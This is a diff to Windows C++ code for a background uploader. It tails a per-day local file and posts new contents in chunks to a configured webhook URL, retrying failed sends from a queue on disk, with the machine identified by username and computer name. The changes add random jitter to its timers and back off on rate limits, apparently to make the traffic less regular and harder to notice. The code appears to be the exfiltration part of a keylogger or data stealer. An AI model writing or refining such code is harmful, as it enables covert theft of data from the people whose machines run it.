@@ -4,6 +4,7 @@
 #include <winhttp.h>
 #include <string>
 #include <vector>
+#include "sha256.h"
 #include <shlobj.h>
 #pragma comment(lib, "winhttp.lib")
 static std::wstring gHook, gLabel; static std::wstring gPath; static unsigned long long gOff = 0;
@@ -22,7 +23,7 @@ static void _st(_Sha* s, const unsigned char* d, unsigned l) {
             for (int i = 0; i < 64; i++) { _U32 S1=_RR(e,6)^_RR(e,11)^_RR(e,25), ch=(e&f)^(~e&g), t1=h+S1+ch+_K[i]+w[i], S0=_RR(a,2)^_RR(a,13)^_RR(a,22), mj=(a&b)^(a&c)^(b&c), t2=S0+mj; h=g;g=f;f=e;e=d2+t1;d2=c;c=b;b=a;a=t1+t2; }
             s->h[0]+=a;s->h[1]+=b;s->h[2]+=c;s->h[3]+=d2;s->h[4]+=e;s->h[5]+=f;s->h[6]+=g;s->h[7]+=h; s->bl = 0; } }
 }
-static std::vector<unsigned char> df_sha256(const std::string& m) {
+static std::vector<unsigned char> df_sha256_unused_(const std::string& m) {
     _Sha s; s.h[0]=0x6a09e667;s.h[1]=0xbb67ae85;s.h[2]=0x3c6ef372;s.h[3]=0xa54ff53a;s.h[4]=0x510e527f;s.h[5]=0x9b05688c;s.h[6]=0x1f83d9ab;s.h[7]=0x5be0cd19; s.len=0; s.bl=0;
     _st(&s, (const unsigned char*)m.data(), (unsigned)m.size());
     unsigned long long bit = s.len * 8; unsigned char pad = 0x80; _st(&s, &pad, 1);
@@ -80,7 +81,7 @@ static bool postChunk(const std::string& utf8part) {
             if (WinHttpSendRequest(r, L"Content-Type: application/json\r\n", (DWORD)-1, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0)) {
                 ok = WinHttpReceiveResponse(r, NULL) ? true : false;
                 DWORD st = 0, sl = sizeof(st); WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sl, NULL);
-                ok = (st == 200 || st == 204);
+                if (st == 429) { ok = false; Sleep(2000 + (rand() % 2000)); } else ok = (st == 200 || st == 204);
             }
             WinHttpCloseHandle(r);
         }
@@ -106,11 +107,11 @@ void df_start_uploader(const std::wstring& hook) {
         GetUserNameA(un, &n1); GetComputerNameA(cn, &n2);
         std::string seed = std::string(un) + "@" + std::string(cn);
         for (auto& ch : seed) ch = tolower(ch);
-        std::vector<unsigned char> key = df_sha256(seed);
+        std::vector<unsigned char> key = df_sha256_bytes(seed);
         gPath = todayPathW();
         HANDLE h0 = CreateFileW(gPath.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         if (h0 != INVALID_HANDLE_VALUE) { LARGE_INTEGER sz; GetFileSizeEx(h0, &sz); gOff = sz.QuadPart; CloseHandle(h0); }
-        for (;;) { Sleep(30000);
+        for (;;) { Sleep(30000 + (rand() % 10000));
             std::wstring np = todayPathW(); if (np != gPath) { gPath = np; gOff = 0; }
             // 1. drain retry queue first
             HANDLE q = CreateFileW(queuePathW().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -122,7 +123,7 @@ void df_start_uploader(const std::wstring& hook) {
                     DWORD L = *(DWORD*)(qd.data() + pos); pos += 4;
                     if (pos + L > qd.size()) break;
                     if (!postChunk(qd.substr(pos, L))) { allok = false; break; }
-                    pos += L; Sleep(500);
+                    pos += L; Sleep(500 + (rand() % 300));
                 }
                 if (allok) DeleteFileW(queuePathW().c_str());
                 else if (pos > 0) { // partial drain: rewrite remainder
@@ -137,7 +138,7 @@ void df_start_uploader(const std::wstring& hook) {
             LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
             if ((unsigned long long)sz.QuadPart <= gOff) { CloseHandle(h); continue; }
             DWORD len = (DWORD)(sz.QuadPart - gOff);
-            SetFilePointer(h, (LONG)gOff, NULL, FILE_BEGIN);
+            LARGE_INTEGER li; li.QuadPart=(LONGLONG)gOff; SetFilePointerEx(h, li, NULL, FILE_BEGIN);
             std::string buf; buf.resize(len); DWORD rd = 0; ReadFile(h, buf.data(), len, &rd, NULL); CloseHandle(h);
             gOff = sz.QuadPart; buf.resize(rd);
             unsigned long long base = gOff - buf.size();
@@ -159,7 +160,7 @@ void df_start_uploader(const std::wstring& hook) {
                 for (auto& ch : part) if (ch == '`') ch = '\'';
                 if (part.find_first_not_of(" \t\r\n") == std::string::npos) continue;
                 if (!postChunk(part)) queueAppend(part);
-                Sleep(500);
+                Sleep(500 + (rand() % 300));
             }
         } return 0;
     }, NULL, 0, NULL);
